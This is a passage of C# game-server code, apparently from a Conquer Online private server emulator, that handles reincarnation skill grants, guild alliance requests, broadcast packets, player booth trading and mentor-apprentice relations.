                        client.AddSpell(new Spell(true) { ID = 1020 });//Shield
                        client.AddSpell(new Spell(true) { ID = 1040 });//Roar
                        client.AddSpell(new Spell(true) { ID = 3060 });//Reflect
                        client.AddSpell(new Spell(true) { ID = 1025 });//Superman
                    }
                }
                #endregion
                #region Brucelee-Water
                if (client.Entity.FirstRebornClass == 85 && client.Entity.SecondRebornClass == 135)
                {

                    if (client.Entity.Class == 11 || client.Entity.Class == 21 || client.Entity.Class == 41 || client.Entity.Class == 51 || client.Entity.Class == 61 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1020 });//Shield
                        client.AddSpell(new Spell(true) { ID = 1040 });//Roar
                        client.AddSpell(new Spell(true) { ID = 1280 });//Water Elf
                        client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
                        client.AddSpell(new Spell(true) { ID = 1015 });//Accuracy
                        client.AddSpell(new Spell(true) { ID = 1350 });//DivineHare
                        client.AddSpell(new Spell(true) { ID = 1095 });//Stigma
                    }
                    else if (client.Entity.Class == 132)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 3090 });//Pervade
                    }
                    else if (client.Entity.Class == 142)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1280 });//Water Elf
                        client.AddSpell(new Spell(true) { ID = 1175 });//dvanced Cure
                        client.AddSpell(new Spell(true) { ID = 1075 });//Invisibility 
                        client.AddSpell(new Spell(true) { ID = 1055 });//Healing Rain
                        client.AddSpell(new Spell(true) { ID = 1050 });//XP Revive
                        client.AddSpell(new Spell(true) { ID = 1350 });//Divine Hare
                    }
                }

                #endregion
                #region Brucelee-Nin
                if (client.Entity.FirstRebornClass == 85 && client.Entity.SecondRebornClass == 55)
                {
                    if (client.Entity.Class == 51)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 6002 });//PoisonStar
                    }
                    else if (client.Entity.Class == 11 || client.Entity.Class == 132 || client.Entity.Class == 21 || client.Entity.Class == 41 || client.Entity.Class == 51 || client.Entity.Class == 61 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 6001 });//Toxic Fog
                    }
                }
                #endregion
                #region Brucelee-Monk
                if (client.Entity.FirstRebornClass == 85 && client.Entity.SecondRebornClass == 65)
                {

                    if (client.Entity.Class == 11 || client.Entity.Class == 21 || client.Entity.Class == 41 || client.Entity.Class == 51 || client.Entity.Class == 132 || client.Entity.Class == 142)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                    }
                    else if (client.Entity.Class == 61)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 10405 });//soulshackle
                        client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                    }
                    else if (client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                    }
                }
                #endregion
                #region Brucelee-Pirate
                if (client.Entity.FirstRebornClass == 85 && client.Entity.SecondRebornClass == 75)
                {
                    client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                    client.AddSpell(new Spell(true) { ID = 11070 });//Gale Bomb
                }
                #endregion
                #region Brucelee-Brucelee
                if (client.Entity.FirstRebornClass == 85 && client.Entity.SecondRebornClass == 85)
                {

                    if (client.Entity.Class == 11 || client.Entity.Class == 21 || client.Entity.Class == 41 || client.Entity.Class == 51 || client.Entity.Class == 132 || client.Entity.Class == 142 || client.Entity.Class == 61 || client.Entity.Class == 71)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                    }
                    else if (client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 12300 });//Dragon Fury
                    }
                }
                #endregion
                #endregion
                #endregion

                #region Low level items
                for (byte i = 1; i < 9; i++)
                {
                    if (i != 7)
                    {
                        ConquerItem item = client.Equipment.TryGetItem(i);
                        if (item != null && item.ID != 0)
                        {
                            try
                            {
                                //client.UnloadItemStats(item, false);
                                Database.ConquerItemInformation cii = new MTA.Database.ConquerItemInformation(item.ID, item.Plus);
                                item.ID = cii.LowestID(Network.PacketHandler.ItemMinLevel(Network.PacketHandler.ItemPosition(item.ID)));
                                item.Mode = MTA.Game.Enums.ItemMode.Update;
                                item.Send(client);
                                client.LoadItemStats();
                                Database.ConquerItemTable.UpdateItemID(item, client);
                            }
                            catch
                            {
                                Console.WriteLine("Reborn item problem: " + item.ID);
                            }
                        }
                    }
                }
                ConquerItem hand = client.Equipment.TryGetItem(5);
                if (hand != null)
                {
                    if (!client.Equipment.Remove(5))
                    {
                        if (client.Warehouses[MTA.Game.ConquerStructures.Warehouse.WarehouseID.Market].Count < 20)
                            client.Warehouses[MTA.Game.ConquerStructures.Warehouse.WarehouseID.Market].Add(hand);
                        Database.ConquerItemTable.UpdatePosition(hand);
                        ClientEquip equips = new ClientEquip();
                        equips.DoEquips(client);
                        client.Send(equips);
                    }
                    client.CalculateStatBonus();
                    client.CalculateHPBonus();
                }
                hand = client.Equipment.TryGetItem(25);
                if (hand != null)
                {
                    if (!client.Equipment.Remove(25))
                    {

                        if (client.Warehouses[MTA.Game.ConquerStructures.Warehouse.WarehouseID.Market].Count < 20)
                            client.Warehouses[MTA.Game.ConquerStructures.Warehouse.WarehouseID.Market].Add(hand);
                        Database.ConquerItemTable.UpdatePosition(hand);
                        ClientEquip equips = new ClientEquip();
                        equips.DoEquips(client);
                        client.Send(equips);
                    }
                    client.CalculateStatBonus();
                    client.CalculateHPBonus();
                }
                client.LoadItemStats();
                client.SendScreen(client.Entity.SpawnPacket, false);
                #endregion

                Database.DataHolder.GetStats(client.Entity.Class, client.Entity.Level, client);
                client.CalculateStatBonus();
                client.CalculateHPBonus();
                client.GemAlgorithm();

                Network.PacketHandler.WorldMessage(client.Entity.Name + " has got Reincarnation! Congratulations!");
            }
        }

        #endregion
        #region Guilds
        /*    private static void AllyGuilds(string name, GameState client)
        {
            using (Dictionary<uint, MTA.Game.ConquerStructures.Society.Guild>.ValueCollection.Enumerator enumerator = Kernel.Guilds.Values.GetEnumerator())
            {
                Action action = null;
                MTA.Game.ConquerStructures.Society.Guild guild;
                while (enumerator.MoveNext())
                {
                    guild = enumerator.Current;
                    if ((((guild.Name == name) && (client.Guild.Name != name)) && (guild.Leader != null)) && guild.Leader.IsOnline)
                    {
                        guild.Leader.Client.OnMessageBoxEventParams = new object[] { guild, client.Guild };
                        client.OnMessageBoxEventParams = new object[] { guild, client.Guild };
                        GameState Leader = guild.Leader.Client;
                        Leader.MessageOK = delegate
                        {
                            MTA.Game.ConquerStructures.Society.Guild guild1 = Leader.OnMessageBoxEventParams[0] as MTA.Game.ConquerStructures.Society.Guild;
                            MTA.Game.ConquerStructures.Society.Guild guild2 = Leader.OnMessageBoxEventParams[1] as MTA.Game.ConquerStructures.Society.Guild;
                            guild1.AddAlly(guild2.Name);
                            guild2.AddAlly(guild1.Name);
                            if (((guild1.Leader.Client != null) && guild1.Leader.Client.Socket.Connected) && ((guild2.Leader.Client != null) && guild2.Leader.Client.Socket.Connected))
                            {
                                guild2.Leader.Client.Send(new MTA.Network.GamePackets.Message(guild1.Leader.Name + " has accepted your ally request.", System.Drawing.Color.Blue, 0x7dc));
                            }
                        };
                        if (action == null)
                        {
                            action = delegate
                            {
                                try
                                {
                                    if (((guild.Leader.Client != null) && guild.Leader.Client.Socket.Connected) && (guild.Leader.Client.OnMessageBoxEventParams != null))
                                    {
                                        Game.ConquerStructures.Society.Guild guild1 = guild.Leader.Client.OnMessageBoxEventParams[1] as Game.ConquerStructures.Society.Guild;
                                        Game.ConquerStructures.Society.Guild guild2 = guild.Leader.Client.OnMessageBoxEventParams[0] as Game.ConquerStructures.Society.Guild;
                                        if (guild1.Leader.IsOnline)
                                        {
                                            guild1.Leader.Client.Send(new MTA.Network.GamePackets.Message(guild2.Leader.Name + " has declined your ally request.", System.Drawing.Color.Blue, 0x7dc));
                                        }
                                    }
                                }
                                catch (Exception exception)
                                {
                                    Program.SaveException(exception);
                                }
                            };
                        }
                        guild.Leader.Client.MessageCancel = action;
                        guild.Leader.Client.Send(new NpcReply(6, client.Entity.Name + " , GuildLeader of " + client.Guild.Name + " wants to make with you an alliance."));
                    }
                }
            }
        }
        */
        #region Guilds
        static void AllyGuilds(string name, Client.GameState client)
        {
            foreach (var guild in Kernel.Guilds.Values)
            {
                if (guild.Name == name && client.Guild.Name != name)
                {
                    if (guild.Leader != null)
                    {
                        if (guild.Leader.IsOnline)
                        {
                            guild.Leader.Client.OnMessageBoxEventParams = new object[]
                                                            {
                                                                guild,
                                                                client.Guild
                                                            };
                            client.OnMessageBoxEventParams = new object[]
                                                            {
                                                                guild,
                                                                client.Guild
                                                            };
                            Client.GameState Leader = guild.Leader.Client;
                            Leader.MessageOK = delegate
                            {
                                Game.ConquerStructures.Society.Guild Guild1 =
                                    Leader.OnMessageBoxEventParams[0] as Game.ConquerStructures.Society.Guild;
                                Game.ConquerStructures.Society.Guild Guild2 =
                                    Leader.OnMessageBoxEventParams[1] as Game.ConquerStructures.Society.Guild;
                                if (Guild1.Ally.Count == 6 || Guild2.Ally.Count == 6)
                                    return;
                                Guild1.AddAlly(Guild2.Name);
                                Guild2.AddAlly(Guild1.Name);

                                if (Guild1.Leader.Client != null)
                                {
                                    if (Guild1.Leader.Client.Socket.Alive)
                                    {
                                        if (Guild2.Leader.Client != null && Guild2.Leader.Client.Socket.Alive)
                                        {
                                            Guild2.Leader.Client.Send(new Message(Guild1.Leader.Name + " has accepted your ally request.", System.Drawing.Color.Blue, Message.TopLeft));
                                        }
                                    }
                                }
                            };
                            guild.Leader.Client.MessageCancel = delegate
                            {
                                try
                                {
                                    if (guild.Leader.Client != null)
                                    {
                                        if (guild.Leader.Client.Socket.Alive)
                                        {
                                            if (guild.Leader.Client.OnMessageBoxEventParams != null)
                                            {
                                                Game.ConquerStructures.Society.Guild Guild2 =
                                                    guild.Leader.Client.OnMessageBoxEventParams[1] as Game.ConquerStructures.Society.Guild;
                                                Game.ConquerStructures.Society.Guild Guild1 =
                                                    guild.Leader.Client.OnMessageBoxEventParams[0] as Game.ConquerStructures.Society.Guild;

                                                if (Guild2.Leader.IsOnline)
                                                {
                                                    Guild2.Leader.Client.Send(new Message(Guild1.Leader.Name + " has declined your ally request.", System.Drawing.Color.Blue, Message.TopLeft));
                                                }
                                            }
                                        }
                                    }
                                }
                                catch (Exception e)
                                {
                                    Program.SaveException(e);
                                }
                            };
                            guild.Leader.Client.Send(new NpcReply(NpcReply.MessageBox, client.Entity.Name + " , GuildLeader of " + client.Guild.Name + " wants to make with you an alliance."));
                        }
                    }
                }
            }
        }
        #endregion
        #endregion
        #region Broadcast
        public static void BroadcastInfoAwaiting(Broadcast broadcast, Client.GameState client)
        {
            byte[] buffer = new byte[500];
            Writer.WriteUInt16(2051, 2, buffer);
            int test = 0;
            ushort total = 0;
            if (broadcast.dwParam * 10 + 10 >= Constants.MaxBroadcasts)
                test = Constants.MaxBroadcasts;
            else
                test = (int)broadcast.dwParam * 10 + 10;
            for (uint i = broadcast.dwParam * 10; i < test; i++)
            {
                if (Game.ConquerStructures.Broadcast.Broadcasts.Count > i)
                {
                    var Broadcast = Game.ConquerStructures.Broadcast.Broadcasts[(int)i];
                    Writer.WriteUInt32((ushort)broadcast.dwParam, 4, buffer);
                    Writer.WriteUInt16(total, 8, buffer);
                    int offset = 12 + buffer[10] * 112;
                    buffer[10]++;
                    Writer.WriteUInt32(Broadcast.ID, offset, buffer); offset += 4;
                    Writer.WriteUInt32(i, offset, buffer); offset += 4;
                    Writer.WriteUInt32(Broadcast.EntityID, offset, buffer); offset += 4;
                    Writer.WriteString(Broadcast.EntityName, offset, buffer); offset += 16;
                    Writer.WriteUInt32(Broadcast.SpentCPs, offset, buffer); offset += 4;
                    Writer.WriteString(Broadcast.Message, offset, buffer);
                    if (buffer[10] % 4 == 0)
                    {
                        total++;
                        Writer.WriteUInt16((ushort)(12 + buffer[10] * 112 + 6 + 2), 0, buffer);
                        byte[] Buffer = new byte[12 + buffer[10] * 112 + 6 + 2 + 8];
                        System.Buffer.BlockCopy(buffer, 0, Buffer, 0, Buffer.Length);
                        client.Send(Buffer);
                        buffer = new byte[500];
                        Writer.WriteUInt16(2051, 2, buffer);
                    }
                }
                else
                {
                    Writer.WriteUInt16((ushort)(12 + buffer[10] * 112 + 6 + 2), 0, buffer);
                    byte[] Buffer = new byte[12 + buffer[10] * 112 + 6 + 2 + 8];
                    System.Buffer.BlockCopy(buffer, 0, Buffer, 0, Buffer.Length);
                    if (buffer[10] != 0 || buffer[10] == 0 && total == 0)
                        client.Send(Buffer);
                    break;
                }
            }
        }
        public static void BroadcastClientMessages(Broadcast broadcast, Client.GameState client)
        {
            byte[] buffer = new byte[500];
            Writer.WriteUInt16(2051, 2, buffer);
            int test = 0;
            ushort total = 0;
            for (int i = 0; i < Game.ConquerStructures.Broadcast.Broadcasts.Count; i++)
                if (Game.ConquerStructures.Broadcast.Broadcasts[i].EntityID == client.Entity.UID)
                    test++;
            if ((10 * broadcast.dwParam + 10) >= Game.ConquerStructures.Broadcast.Broadcasts.Count)
            {
                return;
            }
            for (uint i = broadcast.dwParam * 10; i < test; i++)
            {
                if (Game.ConquerStructures.Broadcast.Broadcasts.Count > i)
                {
                    var Broadcast = Game.ConquerStructures.Broadcast.Broadcasts[(int)i];
                    if (Broadcast.EntityID != client.Entity.UID)
                        continue;
                    Writer.WriteUInt32((ushort)broadcast.dwParam, 4, buffer);
                    Writer.WriteUInt16(total, 8, buffer);
                    int offset = 12 + buffer[10] * 112;
                    buffer[10]++;
                    Writer.WriteUInt32(Broadcast.ID, offset, buffer); offset += 4;
                    Writer.WriteUInt32(i, offset, buffer); offset += 4;
                    Writer.WriteUInt32(Broadcast.EntityID, offset, buffer); offset += 4;
                    Writer.WriteString(Broadcast.EntityName, offset, buffer); offset += 16;
                    Writer.WriteUInt32(Broadcast.SpentCPs, offset, buffer); offset += 4;
                    Writer.WriteString(Broadcast.Message, offset, buffer);
                    if (buffer[10] % 4 == 0)
                    {
                        total++;
                        Writer.WriteUInt16((ushort)(12 + buffer[10] * 112 + 6 + 2), 0, buffer);
                        byte[] Buffer = new byte[12 + buffer[10] * 112 + 6 + 2 + 8];
                        System.Buffer.BlockCopy(buffer, 0, Buffer, 0, Buffer.Length);
                        client.Send(Buffer);
                        buffer = new byte[500];
                        Writer.WriteUInt16(2051, 2, buffer);
                    }
                }
                else
                {
                    Writer.WriteUInt16((ushort)(12 + buffer[10] * 112 + 6 + 2), 0, buffer);
                    byte[] Buffer = new byte[12 + buffer[10] * 112 + 6 + 2 + 8];
                    System.Buffer.BlockCopy(buffer, 0, Buffer, 0, Buffer.Length);
                    if (buffer[10] != 0 || buffer[10] == 0 && total == 0)
                        client.Send(Buffer);
                    break;
                }
            }
        }
        #endregion
        #region Booth
        static void ShowBoothItems(ItemUsage usage, Client.GameState client)
        {
            Client.GameState Owner = null;
            Game.Entity entity = null;
            Game.ConquerStructures.Booth booth = null;
            if (Game.ConquerStructures.Booth.TryGetValue(usage.UID, out booth))
            {
                Owner = booth.Base.Owner;
                entity = Owner.Entity;
                if (client.Trade.InTrade || Owner.Trade.InTrade)
                    return;
                if (Owner != null)
                {
                    if (Owner.Entity.UID != client.Entity.UID)
                    {
                        BoothItem Item = new BoothItem(true);
                        if (Owner.Booth != null)
                        {
                            foreach (Game.ConquerStructures.BoothItem item in Owner.Booth.ItemList.Values)
                            {
                                Item.Fill(item, Owner.Booth.Base.UID);
                                client.Send(Item);
                                item.Item.SendExtras(client);
                            }
                        }
                    }
                }
            }
            if (Game.ConquerStructures.Booth.TryGetValue2(usage.UID, out booth))
            {
                BoothItem Item = new BoothItem(true);
                if (booth != null)
                {
                    foreach (Game.ConquerStructures.BoothItem item in booth.ItemList.Values)
                    {
                        Item.Fill(item, usage.UID);
                        client.Send(Item);
                        item.Item.SendExtras(client);
                    }
                }
            }
        }
        static void AddItemOnBooth(ItemUsage usage, Client.GameState client)
        {
            if (client.Booth != null && !client.Trade.InTrade)
            {
                if (!client.Booth.ItemList.ContainsKey(usage.UID))
                {
                    if (client.Inventory.ContainsUID(usage.UID))
                    {
                        Game.ConquerStructures.BoothItem item = new MTA.Game.ConquerStructures.BoothItem();
                        item.Cost = usage.dwParam;
                        client.Inventory.TryGetItem(usage.UID, out item.Item);
                        Database.ConquerItemInformation infos = new Database.ConquerItemInformation(item.Item.ID, 0);
                        if (item.Item.Lock != 0 || item.Item.Suspicious || item.Item.Bound || infos.BaseInformation.Type != Database.ConquerItemBaseInformation.ItemType.Dropable)
                        {
                            return;
                        }
                        if (Constants.SoulList.Contains((int)item.Item.ID) && item.Cost < 1000000)
                        {
                            Network.GamePackets.NpcReply npc = new Network.GamePackets.NpcReply(6, "you cant sell any special soul item less than 1kk cps ok?");
                            npc.OptionID = 255;
                            client.Send(npc.ToArray());
                            return;
                        }
                        if (Constants.SoulList.Contains((int)item.Item.Purification.PurificationItemID) && item.Cost < 1000000)
                        {
                            Network.GamePackets.NpcReply npc = new Network.GamePackets.NpcReply(6, "you cant sell any special soul item less than 3kk cps ok?");
                            npc.OptionID = 255;
                            client.Send(npc.ToArray());
                            return;
                        }
                        if (Constants.SoulList.Contains((int)item.Item.Purification.PurificationItemID) && item.Cost_Type == MTA.Game.ConquerStructures.BoothItem.CostType.Silvers)
                        {
                            Network.GamePackets.NpcReply npc = new Network.GamePackets.NpcReply(6, "you cant sell any special soul item for silver?");
                            npc.OptionID = 255;
                            client.Send(npc.ToArray());
                            return;
                        }
                        item.Cost_Type = usage.ID == ItemUsage.AddItemOnBoothForSilvers ? MTA.Game.ConquerStructures.BoothItem.CostType.Silvers : MTA.Game.ConquerStructures.BoothItem.CostType.ConquerPoints;
                        client.Booth.ItemList.Add(item.Item.UID, item);
                        client.Send(usage);
                        BoothItem Item = new BoothItem(true);
                        Item.Fill(item, client.Booth.Base.UID);
                        client.SendScreen(Item, false);
                    }
                }
            }
        }
        static void BuyFromBooth(ItemUsage usage, Client.GameState client)
        {
            Client.GameState Owner = null;
            Game.Entity entity = null;
            Game.ConquerStructures.Booth booth = null;
            if (Game.ConquerStructures.Booth.TryGetValue(usage.dwParam, out booth))
            {//k that should be it, test and see ok
                Owner = booth.Base.Owner;
                entity = Owner.Entity;
                if (client.Trade.InTrade || Owner.Trade.InTrade)
                    return;
                if (Owner != null)
                {
                    if (Owner.Trade != null)
                    {
                        if (Owner.Trade.InTrade) return;
                    }
                    if (Owner.Entity.UID != client.Entity.UID)
                    {
                        if (Owner.Booth.ItemList.ContainsKey(usage.UID))
                        {
                            Game.ConquerStructures.BoothItem item;
                            if (Owner.Booth.ItemList.TryGetValue(usage.UID, out item))
                            {
                                if (client.Inventory.Count <= 39)
                                {
                                    if (item.Cost_Type == MTA.Game.ConquerStructures.BoothItem.CostType.Silvers)
                                    {
                                        if (client.Entity.Money >= item.Cost)
                                        {
                                            client.Entity.Money -= item.Cost;
                                            //Database.EntityTable.UpdateMoney(client);
                                            Owner.Entity.Money += item.Cost;
                                            //Database.EntityTable.UpdateMoney(Owner);
                                            client.Send(usage);
                                            client.Inventory.Add(item.Item, Game.Enums.ItemUse.Move);
                                            usage.ID = ItemUsage.RemoveItemFromBooth;
                                            Owner.Send(usage);
                                            Owner.Inventory.Remove(item.Item.UID, Game.Enums.ItemUse.None, false);
                                            usage.ID = ItemUsage.RemoveInventory;
                                            Owner.Send(usage);
                                            Owner.Booth.ItemList.Remove(item.Item.UID);
                                            Database.ConquerItemInformation infos = new Database.ConquerItemInformation(item.Item.ID, 0);
                                            Owner.Send(Constants.BoothItemSell(client.Entity.Name, infos.BaseInformation.Name, false, item.Cost));
                                            Program.AddVendorLog(Owner.Entity.Name, client.Entity.Name, item.Cost.ToString() + " Silvers", item.Item);
                                        }
                                    }
                                    else
                                    {
                                        if (client.Entity.ConquerPoints >= item.Cost)
                                        {
                                            client.Entity.ConquerPoints -= item.Cost;
                                            Database.EntityTable.UpdateCps(client);
                                            Owner.Entity.ConquerPoints += item.Cost;
                                            Database.EntityTable.UpdateCps(Owner);
                                            client.Send(usage);
                                            client.Inventory.Add(item.Item, Game.Enums.ItemUse.Move);
                                            usage.ID = ItemUsage.RemoveItemFromBooth;
                                            Owner.Send(usage);
                                            Owner.Inventory.Remove(item.Item.UID, Game.Enums.ItemUse.None, false);
                                            usage.ID = ItemUsage.RemoveInventory;
                                            Owner.Send(usage);
                                            Owner.Booth.ItemList.Remove(item.Item.UID);
                                            Database.ConquerItemInformation infos = new Database.ConquerItemInformation(item.Item.ID, 0);
                                            Owner.Send(Constants.BoothItemSell(client.Entity.Name, infos.BaseInformation.Name, true, item.Cost));
                                            Program.AddVendorLog(Owner.Entity.Name, client.Entity.Name, item.Cost.ToString() + " CPs", item.Item);
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            if (Game.ConquerStructures.Booth.TryGetValue2(usage.dwParam, out booth))
            {
                if (booth.ItemList.ContainsKey(usage.UID))
                {
                    Game.ConquerStructures.BoothItem item;
                    if (booth.ItemList.TryGetValue(usage.UID, out item))
                    {
                        if (client.Inventory.Count <= 39)
                        {
                            if (item.Cost_Type == MTA.Game.ConquerStructures.BoothItem.CostType.Silvers)
                            {
                                if (client.Entity.Money >= item.Cost)
                                {
                                    client.Entity.Money -= item.Cost;
                                    client.Send(usage);
                                    client.Inventory.Add(item.Item, Game.Enums.ItemUse.Move);
                                    Database.ConquerItemInformation infos = new Database.ConquerItemInformation(item.Item.ID, 0);
                                    Program.AddVendorLog("matrix™[" + usage.dwParam.ToString() + "]", client.Entity.Name, item.Cost.ToString() + " Silvers", item.Item);
                                    var newitem = new Game.ConquerStructures.BoothItem();
                                    newitem.Regenerate(item, booth);
                                    Network.GamePackets.BoothItem Item = new Network.GamePackets.BoothItem(true);
                                    foreach (Game.ConquerStructures.BoothItem i in booth.ItemList.Values)
                                    {
                                        Item.Fill(i, usage.dwParam);
                                        client.Send(Item);
                                        item.Item.SendExtras(client);
                                    }
                                }
                            }
                            else
                            {
                                if (client.Entity.ConquerPoints >= item.Cost)
                                {
                                    client.Entity.ConquerPoints -= item.Cost;
                                    Database.EntityTable.UpdateCps(client);
                                    client.Send(usage);
                                    client.Inventory.Add(item.Item, Game.Enums.ItemUse.Move);
                                    Database.ConquerItemInformation infos = new Database.ConquerItemInformation(item.Item.ID, 0);
                                    Program.AddVendorLog("matrix™[" + usage.dwParam.ToString() + "]", client.Entity.Name, item.Cost.ToString() + " CPs", item.Item);
                                    var newitem = new Game.ConquerStructures.BoothItem();
                                    newitem.Regenerate(item, booth);
                                    Network.GamePackets.BoothItem Item = new Network.GamePackets.BoothItem(true);
                                    foreach (Game.ConquerStructures.BoothItem i in booth.ItemList.Values)
                                    {
                                        Item.Fill(i, usage.dwParam);
                                        client.Send(Item);
                                        item.Item.SendExtras(client);
                                    }
                                }
                            }
                        }

                    }
                }
            }
        }
        static void RemoveItemFromBooth(ItemUsage usage, Client.GameState client)
        {
            if (client.Booth.ItemList.ContainsKey(usage.UID))
            {
                client.Booth.ItemList.Remove(usage.UID);
                client.SendScreen(usage, true);
            }
        }
        #endregion
        #region Mentor Apprentice
        static void ExpelApprentice(MentorApprentice ma, Client.GameState client)
        {
            if (client.Apprentices.ContainsKey(ma.dwParam))
            {
                var appr = client.Apprentices[ma.dwParam];
                if (appr.IsOnline)
                {
                    ma.Type = MentorApprentice.DumpMentor;
                    ma.Online = false;
                    appr.Client.Send(ma);
                    appr.Client.Mentor = null;
                    appr.Client.ReviewMentor();
                }
                Database.KnownPersons.RemoveMentor(appr.ID);
                client.Apprentices.Remove(appr.ID);
            }
        }
        static void LeaveMentor(MentorApprentice ma, Client.GameState client)
        {
            if (client.Mentor != null)
            {
                ma.Type = MentorApprentice.DumpMentor;
                client.Send(ma);
                if (client.Mentor.IsOnline)
                {
                    ma.Type = MentorApprentice.DumpApprentice;
                    client.Mentor.Client.Send(ma);
                    ApprenticeInformation AppInfo = new ApprenticeInformation();
                    AppInfo.Apprentice_ID = client.Entity.UID;
                    AppInfo.Apprentice_Level = 0;
                    AppInfo.Apprentice_Class = 0;
                    AppInfo.Apprentice_PkPoints = 0;
                    AppInfo.Apprentice_Name = client.Entity.Name;
                    AppInfo.Apprentice_Online = false;
                    AppInfo.Apprentice_Spouse_Name = "";
                    AppInfo.Enrole_date = 0;
                    AppInfo.Mentor_ID = client.Mentor.Client.Entity.UID;
                    AppInfo.Mentor_Mesh = client.Mentor.Client.Entity.Mesh;
                    AppInfo.Mentor_Name = client.Mentor.Client.Entity.Name;
                    AppInfo.Type = 2;
                    client.Mentor.Client.Send(AppInfo);
                    client.Mentor.Client.Apprentices.Remove(client.Entity.UID);
                }
                Database.KnownPersons.RemoveMentor(client.Entity.UID);

                client.Mentor = null;
                client.ReviewMentor();
            }
        }
        static void AddMentor(MentorApprentice ma, Client.GameState client)
        {
            Client.GameState Target = null;
            if (Kernel.GamePool.TryGetValue(ma.dwParam, out Target))
            {
                if (!client.Screen.Contains(Target.Entity.UID)) return;

                PopupLevelBP request = new PopupLevelBP();
                request.Requester = client.Entity.UID;
                request.Receiver = Target.Entity.UID;
                request.Level = client.Entity.Level;
                request.BattlePower = (uint)client.Entity.BattlePower;
                Target.Send(request);

                MentorApprentice Mentor = new MentorApprentice(true);
                Mentor.Type = MentorApprentice.AcceptRequestMentor;
                Mentor.dwParam = Target.Entity.UID;
                Mentor.UID = client.Entity.UID;
                Mentor.Level = client.Entity.Level;
                Mentor.Dynamic = (byte)client.Entity.BattlePower;
                Mentor.Online = true;
                Mentor.Name = client.Entity.Name;
                Target.Send(Mentor);
            }
        }
        static void AddApprentice(MentorApprentice ma, Client.GameState client)
        {
            Client.GameState Target = null;
            if (Kernel.GamePool.TryGetValue(ma.dwParam, out Target))
            {
                if (!client.Screen.Contains(Target.Entity.UID)) return;
                if (client.apprtnum == 5) return;

                PopupLevelBP request = new PopupLevelBP();
                request.Requester = client.Entity.UID;
                request.Receiver = Target.Entity.UID;
                request.Level = client.Entity.Level;
                request.BattlePower = (uint)client.Entity.BattlePower;
                Target.Send(request);

                MentorApprentice Mentor = new MentorApprentice(true);
                Mentor.Type = MentorApprentice.AcceptRequestApprentice;
                Mentor.dwParam = Target.Entity.UID;
                Mentor.UID = client.Entity.UID;
                Mentor.Level = client.Entity.Level;
                Mentor.Dynamic = (byte)client.Entity.BattlePower;
                Mentor.Online = true;
                Mentor.Name = client.Entity.Name;

                Target.Send(Mentor);
            }
        }
        static void AcceptRequestMentor(MentorApprentice ma, Client.GameState client)
        {
            Client.GameState Target = null;
            if (Kernel.GamePool.TryGetValue(ma.UID, out Target))
            {
                if (ma.Dynamic == 1)
                {
                    uint EnroleDate = (uint)(DateTime.Now.Year * 10000 + DateTime.Now.Month * 100 + DateTime.Now.Day);

                    Target.Mentor = new MTA.Game.ConquerStructures.Society.Mentor();
                    Target.Mentor.ID = client.Entity.UID;
                    Target.Mentor.Name = client.Entity.Name;
                    Target.Mentor.EnroleDate = EnroleDate;

                    MentorInformation Information = new MentorInformation(true);
                    Information.Mentor_Type = 1;
                    Information.Mentor_ID = Target.Mentor.Client.Entity.UID;
                    Information.Apprentice_ID = Target.Entity.UID;
                    Information.Enrole_Date = EnroleDate;
                    Information.Mentor_Level = Target.Mentor.Client.Entity.Level;
                    Information.Mentor_Class = Target.Mentor.Client.Entity.Class;
                    Information.Mentor_PkPoints = Target.Mentor.Client.Entity.PKPoints;
                    Information.Mentor_Mesh = Target.Mentor.Client.Entity.Mesh;
                    Information.Mentor_Online = true;
                    Information.Shared_Battle_Power = Target.Entity.BattlePowerFrom(Target.Mentor.Client.Entity);
                    Information.String_Count = 3;
                    Information.Mentor_Name = Target.Mentor.Client.Entity.Name;
                    Information.Apprentice_Name = Target.Entity.Name;
                    Information.Mentor_Spouse_Name = Target.Mentor.Client.Entity.Spouse;

                    Target.Send(Information);
                    Target.ReviewMentor();
                    ApprenticeInformation AppInfo = new ApprenticeInformation();
                    AppInfo.Apprentice_ID = Target.Entity.UID;
                    AppInfo.Apprentice_Level = Target.Entity.Level;
                    AppInfo.Apprentice_Name = Target.Entity.Name;
                    AppInfo.Apprentice_Class = Target.Entity.Class;
                    AppInfo.Apprentice_PkPoints = Target.Entity.PKPoints;
                    AppInfo.Apprentice_Online = true;
                    AppInfo.Apprentice_Spouse_Name = Target.Entity.Spouse;
                    AppInfo.Enrole_date = EnroleDate;
                    AppInfo.Mentor_ID = client.Entity.UID;
                    AppInfo.Mentor_Mesh = client.Entity.Mesh;
                    AppInfo.Mentor_Name = client.Entity.Name;
                    AppInfo.Type = 2;
                    client.Send(AppInfo);
                    client.Apprentices.Add(Target.Entity.UID, new MTA.Game.ConquerStructures.Society.Apprentice()
                    {
                        ID = Target.Entity.UID,
                        Name = Target.Entity.Name,
                        EnroleDate = EnroleDate
                    });
                    Database.KnownPersons.AddMentor(Target.Mentor, client.Apprentices[Target.Entity.UID]);
                }
                else
                {
                    Target.Send(new Message(client.Entity.Name + " declined your request.", System.Drawing.Color.Beige, Message.Talk));
                }
            }
        }
        static void AcceptRequestApprentice(MentorApprentice ma, Client.GameState client)
        {
            Client.GameState Target = null;
            if (Kernel.GamePool.TryGetValue(ma.UID, out Target))
            {
